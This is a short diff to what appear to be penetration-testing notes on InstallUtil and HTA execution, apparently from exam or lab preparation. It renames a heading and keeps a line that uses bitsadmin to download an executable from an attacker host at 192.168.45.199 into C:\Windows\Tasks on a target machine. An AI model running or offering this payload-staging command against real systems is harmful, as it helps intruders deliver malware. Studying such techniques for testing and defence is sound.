@@ -1,4 +1,4 @@
-### <ins>InstallUtil (installutil-template.hta)</ins>
+### <ins>InstallUtil (installutil.hta)</ins>
 *Note: if curl is not available on the target machine, we can use bitsadmin instead:*
 - `bitsadmin /transfer myJob http://192.168.45.199/scanVenger.exe C:\Windows\Tasks\scanvenger.exe`
 
